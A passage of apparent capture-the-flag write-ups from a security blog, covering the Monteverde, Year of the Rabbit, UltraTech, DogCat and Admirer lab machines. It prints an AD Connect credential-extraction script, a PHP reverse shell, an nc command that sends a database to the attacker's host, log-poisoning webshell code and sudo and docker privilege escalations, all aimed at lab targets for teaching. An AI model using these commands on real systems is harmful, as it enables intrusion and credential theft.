:\nSF-Port53-TCP:V=7.80%I=7%D=5/24%Time=5ECA58C3%P=x86_64-pc-linux-gnu%r(DNSV\nSF:ersionBindReqTCP,20,\u0026quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\\nSF:x04bind\\0\\0\\x10\\0\\x03\u0026rdquo;);\nService Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results:\n|_clock-skew: -46m45s\n| smb2-security-mode:\n| 2.02:\n|_ Message signing enabled and required\n| smb2-time:\n| date: 2020-05-24T10:37:26\n|_ start_date: N/A\n enum4linux:  Domain Name : MEGABANK.LOCAL\nMachine Name : MONTEVARDE\n Got some users and groups:\n1Group \u0026#39;Trading\u0026#39; (RID: 2610) has member: MEGABANK\\dgalanos 2Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\Administrator 3Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\krbtgt 4Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\AAD_987d7f2f57d2 5Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\mhope 6Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\SABatchJobs 7Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-ata 8Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-bexec 9Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-netapp 10Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\dgalanos 11Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\roleary 12Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\smorgan 13Group \u0026#39;Domain Guests\u0026#39; (RID: 514) has member: MEGABANK\\Guest 14Group \u0026#39;HelpDesk\u0026#39; (RID: 2611) has member: MEGABANK\\roleary 15Group \u0026#39;Group Policy Creator Owners\u0026#39; (RID: 520) has member: MEGABANK\\Administrator 16Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\Administrator 17Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\AAD_987d7f2f57d2 18Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\mhope What is interesting is the group azure admins and its member mhope\nldapsearch 1ldapsearch -x -h 10.10.10.172 -s base namingcontext 2ldapsearch -x -h 10.10.10.172 -s base We find:\n namingContexts: DC=MEGABANK,DC=LOCAL\n Now we can enumerate using ldapsearch\n1ldapsearch -x -b \u0026#34;dc=megabank,dc=local\u0026#34; -h 10.10.10.172 -s sub rpcclient 1rpcclient -U \u0026#39;\u0026#39; 10.10.10.172 1rpcclient $\u0026gt; enumdomusers 1rpcclient $\u0026gt; enumdomgroups 1rpclient $\u0026gt; querygroupmem 0xa29 1rpcclient $\u0026gt; queryuser 0x641 Privilege Escalation - User smbclient bruteforce 1while read USER; do echo $USER \u0026amp;\u0026amp; smbclient -L \\\\\\\\10.10.10.172 -U $USER%$USER; done \u0026lt; users.txt We see an intersting share users$. We mount the share using smbclient and have a look.\n1smbclient \\\\\\\\10.10.10.172\\\\users$ -U SABatchJobs%SABatchJobs In the direcotory of user mhope, we find an interesting file azure.xml, we download it to our local machine usign get\nazure.xml Having a look at the file, we get\n1\u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; 2 \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; 3 \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; 4 \u0026lt;T\u0026gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential\u0026lt;/T\u0026gt; 5 \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; 6 \u0026lt;/TN\u0026gt; 7 \u0026lt;ToString\u0026gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential\u0026lt;/ToString\u0026gt; 8 \u0026lt;Props\u0026gt; 9 \u0026lt;DT N=\u0026#34;StartDate\u0026#34;\u0026gt;2020-01-03T05:35:00.7562298-08:00\u0026lt;/DT\u0026gt; 10 \u0026lt;DT N=\u0026#34;EndDate\u0026#34;\u0026gt;2054-01-03T05:35:00.7562298-08:00\u0026lt;/DT\u0026gt; 11 \u0026lt;G N=\u0026#34;KeyId\u0026#34;\u0026gt;00000000-0000-0000-0000-000000000000\u0026lt;/G\u0026gt; 12 \u0026lt;S N=\u0026#34;Password\u0026#34;\u0026gt;4n0therD4y@n0th3r$\u0026lt;/S\u0026gt; 13 \u0026lt;/Props\u0026gt; 14 \u0026lt;/Obj\u0026gt; 15\u0026lt;/Objs\u0026gt; Here we get a password. Since the file was in the directory of user mhope, it should be the password for mhope\nCreds found:\n User: mhope\nPassword: 4n0therD4y@n0th3r$\n Evil-winrm shell 1evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$ And we get a shell. We also get our required user.txt file.\nPrivilege Escalation - Administrator Azure AD Connect Exploit Previously, we found that our user mhope is a member of the group \u0026ldquo;Azure Admins\u0026rdquo;. Microsoft Azure is a cloud computing service created by Microsoft for building, testing, deploying, and managing applications and services through Microsoft-managed data centers.\nWe search for some azure vulnerabilites. We find an azure AD connect exploit here.. The same vulnerability is also found here..\nAzure AD has a feature called \u0026ldquo;Password Hash Synchronization\u0026rdquo;. With Password Hash Synchronization (PHS), the passwords from on-premise AD are actually sent to the cloud, similar to how domain controllers synchronize passwords between each other via replication. This is done from a service account that is created with the installation of AD Connect. So, using this feature, we can perform a DCsunc attack. Read more on this type of attacks here.\nSo here, the vulnerability allows us to access the DC database containing creds and decrypt it (performing a DCsync). We get the powershell script (here.)[https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1] We change the script according to our needs as follows\n1 Write-Host \u0026#34;AD Connect Sync Credential Extract POC (@_xpn_)`n\u0026#34; 2 3[-] $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source=(localdb)\\.\\ADSync;Initial Catalog=ADSync\u0026#34; 4[+] $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source=localhost; Initial Catalog=ADSync; Trusted_Connection=True\u0026#34; 5 6 $client.Open() 7 $cmd = $client.CreateCommand() 8 $cmd.CommandText = \u0026#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\u0026#34; 9 $reader = $cmd.ExecuteReader() 10 $reader.Read() | Out-Null 11 $key_id = $reader.GetInt32(0) 12 $instance_id = $reader.GetGuid(1) 13 $entropy = $reader.GetGuid(2) 14 $reader.Close() 15 16 $cmd = $client.CreateCommand() 17 $cmd.CommandText = \u0026#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = \u0026#39;AD\u0026#39;\u0026#34; 18 $reader = $cmd.ExecuteReader() 19 $reader.Read() | Out-Null 20 $config = $reader.GetString(0) 21 $crypted = $reader.GetString(1) 22 $reader.Close() 23 24 add-type -path \u0026#39;C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll\u0026#39; 25 $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager 26 $km.LoadKeySet($entropy, $instance_id, $key_id) 27 $key = $null 28 $km.GetActiveCredentialKey([ref]$key) 29 $key2 = $null 30 $km.GetKey(1, [ref]$key2) 31 $decrypted = $null 32 $key2.DecryptBase64ToString($crypted, [ref]$decrypted) 33 34 $domain = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-domain\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Domain\u0026#39;; 35 Expression = {$_.node.InnerXML}} 36 $username = select-xml -Content $config -XPath \u0026#34;//parameter[@name=\u0026#39;forest-login-user\u0026#39;]\u0026#34; | select @{Name = \u0026#39;Username\u0026#39;; 37 Expression = {$_.node.InnerXML}} 38 $password = select-xml -Content $decrypted -XPath \u0026#34;//attribute\u0026#34; | select @{Name = \u0026#39;Password\u0026#39;; Expression = {$_.node.InnerText}} 39 40 Write-Host (\u0026#34;Domain: \u0026#34; + $domain.Domain) 41 Write-Host (\u0026#34;Username: \u0026#34; + $username.Username) 42 Write-Host (\u0026#34;Password: \u0026#34; + $password.Password) We transfer the script to the target machine and run it to get the administrator creds\nCreds found:\n User: administrator\nPassword: d0m@in4dminyeah!\n Administrator shell We use evilwinrm to get a administrator shell and read our required root.txt.\n1evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah! Resources:   Watch this video for in depth discussion of the azure AD exploit\n\n  The original founder of the exploit foxit github contains the tools to do the privesc trick https://github.com/fox-it/adconnectdump\n  PS: the compiled exe files will not work since that uses the local database. But we dont have a database running on our target machine and have to attack the localhost. So we must chnage the source and then compile it to use it.\n","id":4,"section":"writeups","summary":"Nmap Scan  1nmap -sC -sV -sS -oN nmap.out 10.10.10.172 Open ports:\n PORT STATE SERVICE VERSION\n53/tcp open domain?\n88/tcp open kerberos-sec Microsoft Windows Kerberos (server time:\n2020-05-24 10:34:50Z)\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn Microsoft Windows netbios-ssn\n389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:\nMEGABANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp open microsoft-ds?\n464/tcp open kpasswd5?\n593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\n636/tcp open tcpwrapped","tags":["ldap","ad","azure","azure ad connect","powershell","crackmapexec"],"title":"Hackthebox - Montevarde Writeup","uri":"https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-montevarde-writeup/","year":"2020"},{"content":"Initial Foothold Nmap scan 1nmap -sC -sV -sS -oN nmap.out 10.10.104.143 Open ports:\n 21 - vsftpd 3.0.2 22 - ssh 80 - httpd\n Port 80 We got a default apache2 webpage at port 80\nFuzzing the url with gobuster shows a folder /assets\nWe have a look at the css file and fine something interesting\nWe find a php file at /10.10.57.192/sup3r_s3cr3t_fl4g.php Going to the page pops up an alert to turn of javascript and redirects to a youtube page for the song found in RickRolled.mp4\nIt says that the hint is in the video.\nWe intercept the request to this url using burpsuite and look at the http response.\nWe find a hidden directory here. Going to the hidden directory, we get the following page:\nWe got a hot=babe.png picture:\nSteg image We download the picture to our local machine and take a look at it using exiftool\n1exiftool Hot_Babe.png It shows us that the picture has some trailing data after PNG IEND chunk. We have a look at the data using\n1strings Hot_Babe.png So the ftp username is \u0026ldquo;ftpuser\u0026rdquo;\nftp login bruteforce with hydra And we get a list of possible passwords. So we can bruteforce the password using hydra.\n1hydra -l ftpuser -P wordlist.txt ftp://$ip And we get a hit. Creds found:\n ftpuser : 5iez1wGXKfPKQ\n We login to the ftp using the obtained creds.\nPrivilege Escalation : User-eli  Brainfuck programming language Logging in to the ftp, we find a text file named Eli\u0026rsquo;s_Creds.txt. We download the file to our local machin using get, and have a look at it.\nSeems to be some sort of encoded text. Searching on google, we find that the text is actually a progamming language called Brainfuck\nWe use this site :  to interpret our code. Running the code , we get :\nCreds found:\n User: eli Password: DSpDiM1wAEwid\n We use the password to login to ssh as user eli and succeed.\nIn the /home directory, we find another user \u0026ldquo;gwendoline\u0026rdquo;, whose home directory contains the \u0026ldquo;user.txt\u0026rdquo; file. So we have to escalate our privileges to user gwendoline.\nPrivilege Escalation : User-gwandoline Checking a bit, we see that on ssh login of eli, we get a message from root to user gwendoline\nWe try to locate the \u0026ldquo;s3cr3t\u0026rdquo; location and find it in /usr/games. We cat out the file and get the password for the user gwendolne\nCreds found :\n gwendoline : MniVCQVhQHUNI\n Now we su to user gwendoline and read out the user.txt file\nPrivilege Escalation : Root Running sudo -l shows us\nSo, we can run sudo /usr/bin/vi /home/gwendoline/user.txt as ALL users but not root. This (ALL, !root) sudo permission is a known sudo vulnerability with CVE-2019-14287. The exploit is found here.\nSo we run the following command:\n1sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt And we get our vim editor running as root. Now to get a root shell, we go over to gtfobins and follow the instructions to get a root shell and read our flag from root.txt file.\n1vim2:set shell=/bin/sh3:shellExtra findings suid3num.py found us some interesting SUID files:\n1[~] Custom SUID Binaries (Interesting Stuff) 2------------------------------ 3/usr/bin/X 4/usr/bin/procmail 5/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper 6/usr/lib/pt_chown 7------------------------------ Looking for suid files, we got:\n1# find / -perm -u=s -type f 2\u0026gt;/dev/null 2/bin/mount 3/bin/umount 4/bin/su 5/bin/fusermount 6/bin/ntfs-3g 7/usr/bin/vmware-user-suid-wrapper 8/usr/bin/X 9/usr/bin/procmail 10/usr/bin/pkexec 11/usr/bin/gpasswd 12/usr/bin/newgrp 13/usr/bin/sudo 14/usr/bin/chsh 15/usr/bin/chfn 16/usr/bin/at 17/usr/sbin/exim4 18/usr/sbin/pppd 19/usr/lib/policykit-1/polkit-agent-helper-1 20/usr/lib/dbus-1.0/dbus-daemon-launch-helper 21/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper 22/usr/lib/openssh/ssh-keysign 23/usr/lib/pt_chown 24/usr/lib/eject/dmcrypt-get-device   We find a vulnerability for pt_chown which allowd privesc to root here pt_chown is a program included with glibc 2.1.x that exists to aid the proper allocation of terminals for non-suid programs that don\u0026rsquo;t have devpts support. It is installed setuid root. We download the exploit to our local machine and transfer it to our target. Compiling the exploit with gcc, we run it with /dev/ptyxx as arg. But get a permission denied.\n1gcc exploit.c -o exploit 2./exploit /dev/pty12   Exim is vunerable as well. It is a mail server. We find it running on a port internally on the target. We can connect to it using nc. There is an rce here but we failed to exploit it.\n  ","id":5,"section":"writeups","summary":"Initial Foothold Nmap scan 1nmap -sC -sV -sS -oN nmap.out 10.10.104.143 Open ports:\n 21 - vsftpd 3.0.2 22 - ssh 80 - httpd\n Port 80 We got a default apache2 webpage at port 80\nFuzzing the url with gobuster shows a folder /assets\nWe have a look at the css file and fine something interesting\nWe find a php file at /10.10.57.192/sup3r_s3cr3t_fl4g.php Going to the page pops up an alert to turn of javascript and redirects to a youtube page for the song found in RickRolled.","tags":["sudo","CVE-2019-14287","privesc","ftp","hydra","brainfuck","stego","pt_chown"],"title":"TryHackMe - Year of the Rabbit - Writeup","uri":"https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-year-of-the-rabbit-writeup/","year":"2020"},{"content":"Initial Foothold  Nmap scan  nmap -sC -sV -sS -oN nmap.out 10.10.138.104\n 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA) | 256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA) |_ 256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519) 8081/tcp open http Node.js Express framework |_http-cors: HEAD GET POST PUT DELETE PATCH |_http-title: Site doesn\u0026rsquo;t have a title (text/html; charset=utf-8). Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 2002/tcp filtered globe\n Gobuster fuzzing  gobuster shows us a directory /auth in the site that contains a login with password script but doesn\u0026rsquo;t have any inputs in the page.\n/auth page found  We try logging in providing the creds in the params login and passwords as follows http://10.10.138.104:8081/auth?login=admin\u0026amp;password=admin\nAnd, we get the invalid credentials on the page\nNmap port scan  Doing a mass nmap port scan, we find a new port 31331 nmap -p- 10.10.138.104\nOn doing service detection on the port, we find a apache httpd server running on the port\nApache webpage found  Going to the address http://10.10.191.43:31331, we find a webpage\nFuzzing  Fuzzing the website using ffuf, we find some interesting pages\nffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.191.43:31331/FUZZ\nWe find a robots.txt file. Going to the url http://10.10.191.43:31331/robots.txt, we find\nHere, we find a sitemap :\n Sitemap: /utech_sitemap.txt  Going to http://10.10.191.43:31331/utech_sitemap.txt, we find\nThe partners.html page seems interesting, going to the url http://10.10.191.43:31331/partners.html, we find a login page\nExploiting the api with command injection  We try logging in with some common username and passwords but fail. Some basic sql injection fails as well. We have a look at the source of the page.\nWe find that the login page uses authentication script we found earlier at port 8081. We also find a script for the api at the location /js/api.js\nWe go to /js/api.js, and find the following source\nHere we see that, the login page gets pinged by the api at port 8081 at regular intervals to get the upstatus of the page.\nThe ping is done from the url http://${getAPIURL()}/ping?ip=${window.location.hostname}\nSo we go to the url http://10.10.239.42:8081/ping and provide any address to the variable ip. We try with our local ip and get the output of the ping request.\nNow, we try some basic command injection payloads from here We succeed getiing remote command execution of ls using the payload ```ip=`ls````\nPrivilege escalation : User  Database found containing creds  And we get a sqlite database in the directory named utech.db.sqlite\nIn order to read the file, we transfer the file to our local host using the nc utility that we find installed on the target with the following url.\nhttp://10.10.239.42:8081/ping?ip=`nc 10.8.6.75 \u0026lt; utech.db.sqlite` Now, we have the database on our local machine and can read the contents\nWe find 2 users with their password hashes:\n r00t : f357a0c52799563c7c7b76c1e7543a32 admin : 0d0ea5111e3c1def594c1684e3b9be84  Cracking the hash with hashcat  The r00t hash seems to be MD5, we can check this using the \u0026ldquo;analyze hash\u0026rdquo; recipe of cyberchef\nWe crack the hash using hashcat and the wordlist rockyou.txt\n1hashcat -m 0 -o r00t.pass r00t.hash /usr/share/wordlists/rockyou.txt We get the password cracking the hash\nObtained creds:\n r00t : n100906  User ssh  Having the password for r00t, we try ssh ing into the target and succeed\nPrivilege escalation : Root  GTFObins  Right away on the id command, we see that our user r00t is a member of the group docker. Being a member of group docker lets us easily escalate our privilege to root. Thats why in docker, it says only to include trusted members to the group.\nGoing over to gtfobins, we find the command for privesc.\nWe list the docker images and find that we have one name bash. We craft our command accordingly to get a root shell\n1 docker run -v /:/mnt --rm -it bash chroot /mnt sh Now we can read our required private rsa key from the /root/.ssh/ directory\n","id":6,"section":"writeups","summary":"Initial Foothold  Nmap scan  nmap -sC -sV -sS -oN nmap.out 10.10.138.104\n 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA) | 256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA) |_ 256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519) 8081/tcp open http Node.js Express framework |_http-cors: HEAD GET POST PUT DELETE PATCH |_http-title: Site doesn\u0026rsquo;t have a title (text/html; charset=utf-8). Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 2002/tcp filtered globe","tags":["php","command injection","docker","gtfobins","rce"],"title":"TryHackMe - UltraTech Writeup","uri":"https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-ultratech-writeup/","year":"2020"},{"content":"Nmap scan  nmap -sC -sV -oN nmap.out 10.10.174.171 Open ports:\n 22 - SSH 80- http  We have a look at the webpage where it lets us view some dot or cat pictures\nHaving a look at the url, we see that the page is running a php that shows the pictures stored in the dogs/ or cats/ folder which passes the value \u0026ldquo;dog\u0026rdquo; or \u0026ldquo;cat\u0026rdquo; to the variable \u0026ldquo;view\u0026rdquo;.\nWe try some basic LFI here to chech if we can view the /etc/passwd for example with the req url as: http://10.10.174.171/?view=../../../../../../../etc/passwd\nBut it fails showing that only dogs or cats are allowed.\nSo it checks for a string dog or cat in the provided value of view. We try adding \u0026ldquo;dog\u0026rdquo; after a null byte %00 so that it passes the string check but is not evaluated when showing the file. We get the following:\nWe see that we do bypass the string check but it fails to open a the file.\nAccidentally passing dogs to the view variable, we find that the script also adds the extension .php to the end of the file to be viewed passed in the view variable\nLocal File Inclusion  Googling a bit, we find a new php LFI technique found here.\nI originally found it in payloadsallthethings which is a great source for pentesters.\nWe use the technique to get our base64 encoded php source of dog.php and decode it to view the source.\nhttp://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog\nNow we see that we can also check the source of the index.php file using directroy traversal in the same way\nhttp://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog/../index\n1\u0026lt;!DOCCTYPE HTML\u0026gt; 2\u0026lt;html\u0026gt; 3 4\u0026lt;head\u0026gt; 5 \u0026lt;title\u0026gt;dogcat\u0026lt;/title\u0026gt; 6 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;/style.css\u0026#34;\u0026gt; 7\u0026lt;/head\u0026gt; 8 9\u0026lt;body\u0026gt; 10 \u0026lt;h1\u0026gt;dogcat\u0026lt;/h1\u0026gt; 11 \u0026lt;i\u0026gt;a gallery of various dogs or cats\u0026lt;/i\u0026gt; 12 13 \u0026lt;div\u0026gt; 14 \u0026lt;h2\u0026gt;What would you like to see?\u0026lt;/h2\u0026gt; 15 \u0026lt;a href=\u0026#34;/?view=dog\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;dog\u0026#34;\u0026gt;A dog\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a 16href=\u0026#34;/?view=cat\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;cat\u0026#34;\u0026gt;A cat\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; 17 \u0026lt;?php 18 function containsStr($str, $substr) { 19 return strpos($str, $substr) !== false; 20 } 21 $ext = isset($_GET[\u0026#34;ext\u0026#34;]) ? $_GET[\u0026#34;ext\u0026#34;] : \u0026#39;.php\u0026#39;; 22 if(isset($_GET[\u0026#39;view\u0026#39;])) { 23 if(containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;dog\u0026#39;) || 24containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;cat\u0026#39;)) { 25 echo \u0026#39;Here you go!\u0026#39;; 26 include $_GET[\u0026#39;view\u0026#39;] . $ext; 27 } else { 28 echo \u0026#39;Sorry, only dogs or cats are allowed.\u0026#39;; 29 } 30 } 31 ?\u0026gt; 32 \u0026lt;/div\u0026gt; 33\u0026lt;/body\u0026gt; 34 35\u0026lt;/html\u0026gt; What\u0026rsquo;s interesting here is that it allows us to pass an \u0026ldquo;ext\u0026rdquo; variable that contains the file extension. On the variable being unset, it adds the default extension of .php\nSo we check now if we can read the /etc/passwd file with the following request http://10.10.174.171/?view=dog/../../../../etc/passwd\u0026amp;ext=\nAnd we see that we can!\nNow we check if we can find the log file where it logs all our requests. After fiddling around for a bit, we find the logs in the /var/log/apache2/access.log finding out that the server is running apache2. And we see our last request there.\nWe see that the log also saves our user-agent header, in our case, Mozilla Firefox\nSo, we check if we can inject some php code into our user-agent header that will also get executed along with the main php file.\nWe can do this using burpsuite repeater to test again and again.\nWe change the header to hello to test and it works\nNow we test some php commands. First we try the system(\u0026ldquo;\u0026rdquo;) which is suposed to execute the command on the machine and print us the output \u0026lt;?php system(\u0026quot;ls\u0026quot;)?\u0026gt;\nBut executing this once, we somehow break the machine and cannot access the log any more Next we try a webshell like approach that will get a command passed in the cmd variable and execute it. system($_GET['cmd']);\nAnd we have command execution!\nUser www-data  We try some commands and see that we are www-data, we try getting a reverse shell using php. The php reverse shell: php -r '$sock=fsockopen(\u0026quot;10.8.6.75\u0026quot;, 8888);exec(\u0026quot;/bin/bash -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;);'\nWe must url encode the revshell passed in the command. The url encoded request stands: 10.10.12.161/?view=dog/../../../../var/log/apache2/access.log\u0026amp;ext=\u0026amp;cmd=php -r '$sock=fsockopen(\u0026quot;10.8.6.75\u0026quot;,1337);exec(\u0026quot;/bin/bash -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;);'\nWe start a nc listener on port 1337 and get the reverse shell.\nflag1  Right away, we find the flag.php in the current folder. We cat out the contents to get the flag.\nflag1=\u0026quot;THM{Th1s_1s_N0t_4_Catdog_ab67edfa}\u0026quot;\n##flag2 After digging around the files for a bit, we find our second flag in the /var/www directory.\nflag2 = THM{LF1_t0_RC3_aec3fb}\nPrivilege escalation - Root  Next, we try to escalate our privilege to root. We try some enumeration and find that our user can execute /usr/bin/env as sudo using the command sudo -l\nWe look for privesc using env in gtfobins\nWe find that a simple env /bin/sh gives us the shell. So we try that.\nflag3  And, we have escalated to root successfully. lets look for the remaining flags.We find our 3rd flag in the /root directory.\nflag3 = \u0026ldquo;THM{D1ff3r3nt_3nv1ronments_874112}\u0026quot;\nThe flag tells us something about a different environment.\nLooking around for a bit, we find a .dockerenv file in the root directory, which tells us that we are running inside a docker container.\nAfter some looking around, we find an interesting folder in the /opt/backups directory, having a look at the backup.sh file, we find the following\n1tar cf /root/container/backup/backup.tar /root/container Getting out of container  So the script basically backs up the /root/container to the backup.tar file we found. It might be running a cron job. We see that we have write permissions to the file and so, lets try writing a reverse shell into the backup.sh file.\nWe open up a netcat listener on port 8888 and after some time, get a shell back from root.\nflag4  This time, we see that we are on the machine iteself and not inside a docker container. Going into the root home, /root, we fine our flag4:\nflag4 = \u0026ldquo;THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}\u0026quot;\nNew topics learnt:\n Chech the logs docker container, cronjob New php lfi technique  ","id":7,"section":"writeups","summary":"Nmap scan  nmap -sC -sV -oN nmap.out 10.10.174.171 Open ports:\n 22 - SSH 80- http  We have a look at the webpage where it lets us view some dot or cat pictures\nHaving a look at the url, we see that the page is running a php that shows the pictures stored in the dogs/ or cats/ folder which passes the value \u0026ldquo;dog\u0026rdquo; or \u0026ldquo;cat\u0026rdquo; to the variable \u0026ldquo;view\u0026rdquo;.","tags":["php","lfi","docker","cron","rce"],"title":"TryHackMe - DogCat Writeup","uri":"https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/","year":"2020"},{"content":"Initial Foothold  Nmap  Open ports: 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) 80/tcp open tcpwrapped\nFound robots.txt that disallows /admin-dir\nFound a possible user named waldo\nDirectory Busting  Fuzzing for .txt files in the /admin-dir, found 2 files:\n contacts.txt credentials.txt  1ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/admin-dir/FUZZ.txt We find the following in the credentials.txt file.\n[Internal mail account] w.cooper@admirer.htb fgJr6q#S\\W:$P [FTP account] ftpuser %n?4Wz}R$tTF7 [Wordpress account] admin w0rdpr3ss01! ftp login  We login to the ftp server running on port 21 using the creds found\nWe download the 2 files found in the / directory to our local machine using the get \u0026lt;file\u0026gt; command.\nsql dump file  dumps images and related texts, nothing important Running 10.1.41-MariaDB on debian9  html.tar.gz It seems to be a backup of the original site. We find a new directory /utility-scripts and find some interesting php pages there:\n index.php admin_tasks.php db_admin.php  admin_tasks.php At the url (http://10.10.10.187/utility-scripts/admin_tasks.php), we find:\nHere, we can run a some queries about uptime, logged in users, crontab view and some intersting backup files of passwd, shadow and so on which are \u0026ldquo;not working\u0026rdquo; as per the file found in the backup as they require root privileges. The php is as follows:\n1\u0026lt;?php 2// Web Interface to the admin_tasks script 3// 4if(isset($_REQUEST[\u0026#39;task\u0026#39;])) 5{ 6 $task = $_REQUEST[\u0026#39;task\u0026#39;]; 7 if($task == \u0026#39;1\u0026#39; || $task == \u0026#39;2\u0026#39; || $task == \u0026#39;3\u0026#39; || $task == \u0026#39;4\u0026#39; || 8 $task == \u0026#39;5\u0026#39; || $task == \u0026#39;6\u0026#39; || $task == \u0026#39;7\u0026#39;) 9 { 10 /************************************************************************ ********* 11Available options: 121) View system uptime 132) View logged in users 143) View crontab (current user only) 154) Backup passwd file (not working) 165) Backup shadow file (not working) 176) Backup web data (not working) 187) Backup database (not working) 1920NOTE: Options 4-7 are currently NOT working because they need root privileges. 21I\u0026#39;m leaving them in the valid tasks in case I figure out a way 22to securely run code as root from a PHP page. 23************************************************************************* *********/ 24 echo str_replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026lt;br /\u0026gt;\u0026#34;, shell_exec(\u0026#34;/opt/scripts/admin_tasks.sh 25$task2\u0026gt;\u0026amp;1\u0026#34;)); 26 } 27 else 28 { 29 echo(\u0026#34;Invalid task.\u0026#34;); 30 } 31} 32?\u0026gt; We see that the code does not filter our input $task which we can tamper with using curl or burpsuite.\ndb_admin.php We find some credentials for the user waldo here. Looking at the code, we see that what this page does is log in as user waldo to the mysql server, which is accesible only from localhost.\ndb creds found: \u0026gt; $username = \u0026ldquo;waldo\u0026rdquo;; \u0026gt; $password = \u0026ldquo;Wh3r3_1s_w4ld0?\u0026quot;;\nindex.php Having a look at the index.php from the ftp, we see that it differs from the one running on the site. The backed up one had a php code that tries to login to the sql server as the user waldo, but interestingly, with a password different from the one found in db_admin.php. Here, the password seems to have an error(?), with the mismatched \u0026ldquo;.\n1\u0026lt;?php 2 $servername = \u0026#34;localhost\u0026#34;; 3 $username = \u0026#34;waldo\u0026#34;; 4 $password = \u0026#34;]F7jLHw:*G\u0026gt;UPrTo}~A\u0026#34;d6b\u0026#34;; 5$dbname= \u0026#34;admirerdb\u0026#34;; 67// Create connection 8$conn= new mysqli($servername, $username, $password, $dbname); 9// Check connection 10if ($conn-\u0026gt;connect_error) { 11die(\u0026#34;Connection failed: \u0026#34; . 